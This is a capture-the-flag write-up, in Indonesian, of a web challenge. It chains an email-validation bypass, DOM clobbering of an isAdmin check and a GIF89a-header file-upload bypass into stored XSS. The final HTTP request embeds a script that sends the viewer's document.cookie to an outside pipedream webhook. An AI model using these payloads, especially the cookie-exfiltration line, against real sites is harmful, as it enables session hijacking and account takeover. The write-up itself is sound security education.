# XSS2 - Web

## TL;DR

Pada challenge ini kita perlu melakukan DOM clobbering untuk membypass isAdmin di client side, sehingga nantinya kita dapat meload `content` apapun dari source yang ada di server, setelah itu kita perlu melakukan upload dan membypass image check yang ada di server menggunakan ekstensi GIF89a dan meload file yang kita upload di server tadi, sehingga kita mendapatkan XSS.

## Recon

![](https://i.imgur.com/LpIPhuC.png)

Saat kita masuk ke website, kita akan diberikan `login` tab dan `register` tab. 

![](https://i.imgur.com/SSn9Ddu.png)

Saat kita login bisa dilihat disana bahwa input dari credensial yang kita masukkan tadi ter-reflek ke home page user. Sekarang kita akan mencoba untuk menginject html element ke akun menggunakan `<img src=x onerror=alert() />`.

![](https://i.imgur.com/MgOwwTs.png)

Bisa kalian lihat bahwa server memvalidasi email di server side meskipun kita mencoba membypasnya di client side.

![](https://i.imgur.com/WIyLwjR.png)

Tetapi disini kita bisa membypass validasi tersebut dengan memberikan quote di antara payload kita

Ex: "<img/src='x'/onerror='alert()'>"@gmail.com

![](https://i.imgur.com/erMgS9i.png)

Dan kita bisa membypass validasi tersebut.

![](https://i.imgur.com/Sp5HDAH.png)

Tapi disini ada lagi masalah, dimana input kita di filter, sehingga payload kita tidak muncul di halaman utama user.

Bisa dilihat pada source code client terdapat dompurify.

![](https://i.imgur.com/ymNmPGK.png)

setelah itu kalian dapat melihat beberapa kode js dan file main.js sebagai script src.

![](https://i.imgur.com/2ycYLGD.png)

Kode diatas nampaknya mempunyai email kita, yang sudah dirubah menjadi base64, setelah itu email kita tadi akan masuk ke fungsi dompurfiy yang akan men-sanitize imput berbahaya dari inputan email kita tadi.

Sekarang mari kita review `main.js` yang tadi terdapat di inline script src tadi.

![](https://i.imgur.com/wpixaOu.png)

Yang menarik disini ada pada `if(user.isAdmin)`, dimana setelah itu kita akan melihat kode yang membuat element `script` dan menambahkan `content` sebagai src nya.

## Bypassing isAdmin with DOM Clobbering

Sekarang kita tau bahwa jika kita mendapatkan akun admin maka kita akan bisa me-load js kita dan mendapatkan XSS.

Disini kita bisa menggunakan teknik DOM Clobering untuk menjadi admin.

Jadi teknik ini bisa mengubah HTML element dan dengan cara seperti ini `<a id='test'>` dan kita bisa mengaksesnya dengan `test` atau dengan `window.test`.

Jadi kita bisa membuat variable dengan menggunakan teknik html injection seperti ini:

```html
<a id=user><a id='user' name='isAdmin' href=''>
```

Dan email kita akan menjadi seperti ini.

```html
"<a/id=user><a/id='user'/name='isAdmin'/href=''>"@cid.com
```

![](https://i.imgur.com/61LM1FA.png)

Kita bisa melihat bahwa payload kita berhasil terprint, dan sekarang kita adalah admin.

![](https://i.imgur.com/eHt1v2k.png)

Sekarang kita bisa memberikan `content` url parameter. 

Tetapi di script yang dapat dilihat di `main.js` menambahkan `/xss2/scripts/` di belakang url file.

Di login page terdapat file upload, ini bisa kita gunakan untuk mengupload file kita yang berisi script XSS.

Sekarang kita akan mencoba mengupload file yang berisi payload berikut.

```
alert();
```

Tetapi kita akan mendapatkan error seperti ini.

![](https://i.imgur.com/gmiPZO4.png)

Disini kita bisa membypass WAF ini dengan menambahkan header dari file denga `GIF86` tetapi karena `GIF86` akan dideteksi sebagai variable dan akan menghasilkan error `undefined variable` kita perlu menambahkan DOM clobering lagi seperti ini `"<a/id='GIF89a'>`, ini akan membuat variable GIF86 menjadi ada, dan menghilangkan error tersebut.

Kurang lebih seperti di bawah http request yang saya buat untuk mendapatkan XSS. 

```http
POST /xss2/ HTTP/1.1
Host: 172.174.108.207
Content-Length: 852
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.174.108.207
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvx7RraDqCv5SCGof
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.174.108.207/xss2/
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=b434ce1020e25c6b6b6d0ff6567a22f5
Connection: close

------WebKitFormBoundaryvx7RraDqCv5SCGof
Content-Disposition: form-data; name="username"

cid7
------WebKitFormBoundaryvx7RraDqCv5SCGof
Content-Disposition: form-data; name="email"

"<a/id='GIF89a'><a/id=user><a/id='user'/name='isAdmin'/href=''>"@cid.com
------WebKitFormBoundaryvx7RraDqCv5SCGof
Content-Disposition: form-data; name="password"

asd
------WebKitFormBoundaryvx7RraDqCv5SCGof
Content-Disposition: form-data; name="confirm-password"

asd
------WebKitFormBoundaryvx7RraDqCv5SCGof
Content-Disposition: form-data; name="fileToUpload"; filename=".jpg"
Content-Type: image/jpeg

GIF89a
window.location='https://eogki39eznqmcza.m.pipedream.net?c='+document.cookie;
------WebKitFormBoundaryvx7RraDqCv5SCGof
Content-Disposition: form-data; name="register-submit"

Register Now
------WebKitFormBoundaryvx7RraDqCv5SCGof--
```

Setelah kita melakukan request tersebut, dan memberikan url dari akun kita ke admin, kita akan mendapatkan flag di webhook seperti berikut.

![](https://i.imgur.com/He4S8Sw.png)